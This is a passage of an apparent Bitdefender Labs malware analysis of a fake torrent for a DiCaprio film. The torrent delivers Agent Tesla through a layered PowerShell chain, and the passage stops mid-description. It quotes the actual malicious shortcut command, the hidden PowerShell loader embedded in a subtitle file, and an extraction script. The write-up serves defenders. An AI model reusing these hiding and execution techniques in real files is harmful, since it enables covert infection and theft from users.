---
title: Fake Leonardo DiCaprio Movie Torrent Drops Agent Tesla Through Layered PowerShell Chain
url: https://www.bitdefender.com/en-us/blog/labs/fake-leonardo-dicaprio-movie-torrent-agent-tesla-powershell
source: Over Security - Cybersecurity news aggregator
date: 2026-04-09
fetch_date: 2026-04-10T04:46:55.676873
---

# Fake Leonardo DiCaprio Movie Torrent Drops Agent Tesla Through Layered PowerShell Chain

* [Company](/en-us/company/ "Company")
* [Blog](/en-us/blog/ "Blog")

[For Home](/en-us/consumer/ "For Home")[For Business](/en-us/business/ "For Business")[For Partners](/en-us/partners/ "For Partners")

[Consumer Insights](/en-us/blog/hotforsecurity/ "Consumer Insights")[Labs](/en-us/blog/labs/ "Labs")[Business Insights](/en-us/blog/businessinsights/ "Business Insights")

[Anti-Malware Research](/en-us/blog/labs/tag/antimalware-research "Anti-Malware Research")

7 min read

# Fake Leonardo DiCaprio Movie Torrent Drops Agent Tesla Through Layered PowerShell Chain

[![Raul Vasile BUCUR](https://blogapp.bitdefender.com/labs/content/images/size/w100/2025/11/rbucur.jpg "Raul Vasile BUCUR")](/en-us/blog/labs/author/raul-bucur "Raul Vasile BUCUR")[![Silviu STAHIE](https://0.gravatar.com/avatar/c341806f635818bcc6faa8f684e3d9d0?s=64&d=mm&r=g "Silviu STAHIE")](/en-us/blog/labs/author/sstahie "Silviu STAHIE")

[Raul Vasile BUCUR](/en-us/blog/labs/author/raul-bucur "Raul Vasile BUCUR")[Silviu STAHIE](/en-us/blog/labs/author/sstahie "Silviu STAHIE")

December 10, 2025

  ![Fake Leonardo DiCaprio Movie Torrent Drops Agent Tesla Through Layered PowerShell Chain](https://blogapp.bitdefender.com/labs/content/images/size/w600/2025/12/90cbbfab-b875-4654-a654-df248f9c8a73.png "Fake Leonardo DiCaprio Movie Torrent Drops Agent Tesla Through Layered PowerShell Chain")

After noticing a spike in detections involving what looked like a movie torrent for ***One Battle After Another***, Bitdefender researchers started an investigation and discovered that it was a complex infection chain.

The film, Leonardo DiCaprio's latest, has quickly gained notoriety, making it an attractive lure for cybercriminals seeking to infect as many devices as possible.

People often search for the latest movies on the internet, hoping to find a copy of a new release that has just begun its theater run or is only available via pay-per-view streaming. And since users are looking for entertainment, the possibility of infection from downloading a film might not cross their minds.

However, what seems like a simple download can quickly turn into something far more dangerous. Instead of the expected video file, users unknowingly download a compilation of PowerShell scripts and image archives that build into a memory-resident command-and-control (C2) agent, also known as a trojan (RAT – Remote Access Trojan) under the name of Agent Tesla.

This type of malware is designed with a single purpose: to provide attackers with unfettered access to the victim's Windows computer. Once they have a foothold, criminals can access the computer remotely and steal financial and personal information or use the device to launch additional attacks.

The trend of embedding malware in torrents and fake multimedia files that pretend to offer movies and TV shows is not new, but it has gained a lot of steam in the last year or so.

For example,  Mission: Impossible – The Final Reckoning was used to spread the [Lumma Stealer](https://www.bitdefender.com/en-us/blog/hotforsecurity/fake-mission-impossible-lumma-stealer-torrent), which targets passwords, cookies, crypto wallets, credentials from remote desktop tools, and more.

The Agent Tesla malware in this fake movie release has been used for years in many campaigns, including [email phishing](https://www.bitdefender.com/en-us/blog/hotforsecurity/bitdefender-labs-warns-of-agent-tesla-phishing-campaign) and [COVID-19 vaccination registration](https://www.bitdefender.com/en-us/blog/hotforsecurity/threat-actors-spread-agent-tesla-disguised-as-covid-19-vaccination-registration).

This investigation documents every layer of this new attack and shows how the components work together to support its efforts to evade detection.

## Key findings

* The notoriety of Leonardo DiCaprio's new film, **One Battle After Another**, is being used to deploy malware on the Windows machines of unsuspecting users.
* The Agent Tesla RAT itself is not novel, but the deployment of consecutive attack methods leveraging PowerShell and other LOTL (Living Off the Land) tools is highly interesting.
* According to our insights, this particular type of attack has been used only in this torrent download.
* Payload execution is done entirely in memory.
* The attack demonstrates the use of multi-stage scripting, advanced obfuscation techniques, and fileless execution to evade detection and become persistent.
* The goal is to transform the Windows PC into a zombie agent, ready to be used at any time by attackers in other campaigns or to deploy malware further.
* The attack is directed at novices who don't often download pirated content or understand the dangers of torrents.

## Context

The infection begins when a user downloads a torrent that appears to contain the *One Battle After Another* film. Inside the downloaded content, the user will find a shortcut file simply named CD.lnk that indicates it is there to launch the movie.

Clicking on that file, however, triggers a hidden command chain that executes a series of malicious scripts buried inside the subtitle file Part2.subtitles.srt.

The attacker uses several legitimate Windows utilities (CMD, PowerShell, and Task Scheduler) to unpack multiple layers of encrypted data.

## The infection chain

1. **The fake movie launcher**

When the user opens CD.lnk, it runs the following command:

```
\Windows\System32\cmd.exe /c type Part2.subtitles.srt | more | findstr /n "^" | findstr "100: 101: 102: 103:" | for /f "tokens=1,* delims=:" %a in ('more') do cmd /c %b
```

In short, this command translates to read Part2.subtitles.srt, extract lines 100–103, and execute them using cmd.exe and powershell.exe.

Surprisingly, the .srt file actually contains real subtitles, but lines 100 to 103 contain batch code that initiates the attack.

2. **Hidden code inside subtitles**

At the specified lines, the subtitle file runs this batch script:

```
@echo off
cd /d "%~dp0"
powershell -windowstyle hidden -nop -ep Bypass -c "$s=5005;$e=152;$f=('P'+[char]97+'rt'+(1+1)+'.subtitles.srt');(gc $f)|select -Skip $s -First $e|powershell -windowstyle hidden -nop -ep Bypass -f -"
```

This PowerShell command actually opens another file named Part2.subtitles.srt, skips to line 5005, reads 152 lines and executes them, which reveals the next stage.

![](https://blogapp.bitdefender.com/labs/content/images/2025/12/image.png)

3. **Decrypting embedded payloads**

PowerShell code parses encrypted data blocks from the same subtitle file (lines 6034, 7216 and 7419). The script uses AES decryption and writes multiple PowerShell scripts to the following folder:

```
C:\Users\<USER>\AppData\Local\Microsoft\Diagnostics
```

![](https://blogapp.bitdefender.com/labs/content/images/2025/12/image-1.png)

The output: five new PowerShell scripts, each responsible for one stage of the attack.

4. **Script 1: archive extraction**

The first script extracts content from a file called "One Battle After Another.m2ts"  a fake video file that is actually an archive (it's also the largest file).

Depending on the tools available, it uses Expand-Archive, WinRAR, 7-Zip or Bandizip, if found:

```
$arc=".\One Battle After Another.m2ts"; $out=".\";
if($arc -like '*.zip' -and (Get-Command Expand-Archive -Ea 0)){Expand-Archive $arc $out -Force}
elseif($arc -like '*.zip'){($s=New-Object -Com Shell.Application).Namespace($out).CopyHere($s.Namespace($arc).Items(),16)}
elseif(Test-Path "C:\Program Files\WinRAR\WinRAR.exe"){& "C:\Program Files\WinRAR\WinRAR.exe" x -ibck -inul -o+ $arc $out}
elseif(Test-Path "C:\Program Files\7-Zip\7z.exe"){& "C:\Program Files\7-Zip\7z.exe" x $arc -o"$out" -y}
elseif(Test-Path "C:\Program Files\Bandizip\Bandizip.exe"){& "C:\Program Files\Bandizip\Bandizip.exe" x $arc $out -y}
else{"No extractor found"}
```

The script has only one role – to unpack the fake archive for later use.

5. **Script 2: scheduled task creation**

The second script's goal is to establish persistence through the Task Sche...